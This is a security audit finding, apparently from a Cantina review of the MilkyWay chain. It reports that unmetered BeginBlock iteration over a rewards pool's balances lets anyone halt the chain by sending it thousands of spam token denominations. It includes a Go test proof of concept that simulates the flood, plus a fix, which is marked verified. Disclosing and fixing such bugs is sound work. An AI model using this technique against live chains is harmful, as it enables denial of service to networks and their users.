---
tags:
  - lang/solidity
  - platform/cantina
  - has/poc
  - severity/high
  - sector/bridge
  - sector/staking
protocol: "[[MilkyWay]]"
auditors:
  - "[[alpo]]"
report: "https://cdn.cantina.xyz/reports/report_cantina_solo_milkyway_january2025.pdf"
genome:
  - "[[unbounded-loop]]"
  - "[[permanent]]"
  - "[[vote-delegation-loop]]"
---
# Unmetered BeginBlock iteration over balances exposes low-cost, on-demand chain halt 

- id: 46090
- impact: HIGH
- protocol: [[MilkyWay]]
- reporter: alpo (Cantina)
- source: https://cdn.cantina.xyz/reports/report_cantina_solo_milkyway_january2025.pdf

## Summary


This bug report discusses an issue with the AllocateRewards function in the abci.go and allocation.go files. The function makes a call to GetAllBalances on the rewards plan address, which can be triggered by any user. This can lead to a chain halt on-demand of arbitrary length if an attacker sends a large number of spam tokens to the plan's address. A proof of concept is provided in the form of a Go test. The recommendation is to iterate through the rewards plan and check each rewards denom instead of checking all balances. The bug has been fixed in PR 11.

## Details

## Context
- **Source Files**: `abci.go#L15`, `allocation.go#L181`

## Description
`AllocateRewards` makes a call to `GetAllBalances` on the rewards plan address, which triggers iteration over all of the address's balances. Since `AllocateRewards` is called in `BeginBlock`, its execution is unmetered, and any user can permissionlessly send an arbitrary number of spam tokens of different denominations to a plan's address, triggering a chain halt on-demand of arbitrary length.

## Proof of Concept
To reproduce this, run the following Go test in `x/rewards/keeper/allocation_test.go`:

```go
func (suite *KeeperTestSuite) TestAllocateRewards_TokenFlood() {
	// Modify these values to simulate different scenarios
	numTokens := 10000
	tokensPerBlock := 500
	
	// --- Setup 
---
	// Cache the context to avoid conflicts
	ctx, _ := suite.ctx.CacheContext()
	
	// Set up a sample service and operator
	service, _ := suite.setupSampleServiceAndOperator(ctx)
	
	// Create a rewards plan
	planStartTime := ctx.BlockTime()
	planEndTime := planStartTime.Add(24 * time.Hour)
	amountPerDay := sdk.NewCoins(sdk.NewInt64Coin("umilk", 1_000_000_000))
	plan := suite.CreateBasicRewardsPlan(
		ctx,
		service.ID,
		amountPerDay,
		planStartTime,
		planEndTime,
		amountPerDay,
	)

	// Get the plan rewards pool address
	planRewardsPoolAddr := plan.MustGetRewardsPoolAddress(suite.accountKeeper.AddressCodec())
	
	// Simulate an attacker sending tokens across multiple blocks
	attackerAddr := testutil.TestAddress(9999)
	for i := 0; i < numTokens; i += tokensPerBlock {
		blockCoins := sdk.NewCoins()
		end := i + tokensPerBlock
		if end > numTokens {
			end = numTokens
		}
		
		// Create coins for this block's transfers
		for j := i; j < end; j++ {
			denom := fmt.Sprintf("ibc/%d", j)
			coin := sdk.NewInt64Coin(denom, 1)
			blockCoins = blockCoins.Add(coin)
		}
		
		// Fund the attacker's account for this block's transfers
		suite.FundAccount(ctx, attackerAddr.String(), blockCoins)
		
		// Attacker sends the coins to the plan rewards pool address
		err := suite.bankKeeper.SendCoins(
			ctx,
			sdk.MustAccAddressFromBech32(attackerAddr.String()),
			planRewardsPoolAddr,
			blockCoins,
		)
		suite.Require().NoError(err)
		fmt.Println("Deposited", len(blockCoins), "tokens at block", ctx.BlockHeight())
		
		// Advance block
		ctx = ctx.WithBlockHeight(ctx.BlockHeight() + 1)
	}
	
	// Delegate to the service to make the plan active
	delegatorAddr := testutil.TestAddress(1)
	suite.DelegateService(
		ctx,
		service.ID,
		sdk.NewCoins(sdk.NewInt64Coin("umilk", 100_000_000)), // 100 MILK
		delegatorAddr.String(),
		true,
	)
	
	// Advance the context to within the plan's active period
	ctx = ctx.WithBlockTime(planStartTime.Add(1 * time.Hour))
	startTime := time.Now()
	
	// --- Trigger BeginBlock chain halt 
---
	// Track how long AllocateRewards takes
	// Note: the duration of this halt depends directly on the number of tokens deposited
	fmt.Println("Commencing BeginBlock call to `AllocateRewards`...")
	err := suite.keeper.AllocateRewards(ctx)
	suite.Require().NoError(err)
	
	// --- End of chain halt 
---
	duration := time.Since(startTime)
	fmt.Println("Halted chain for", duration, "with", numTokens, "different token denoms")
}
```

## Recommendation
Instead of checking all balances, iterate through the rewards plan and check each rewards denomination with `GetBalance(ctx, planRewardsPoolAddr, rewardDenom)`. 

Please note that the above will not be secure until the finding on unbounded rewards plan Coins array length is resolved, as there are two chain halt vectors that coincide in this part of the code.

## Status Updates
- **MilkyWay**: Fixed in PR 11.
- **Alpo**: Fix verified.
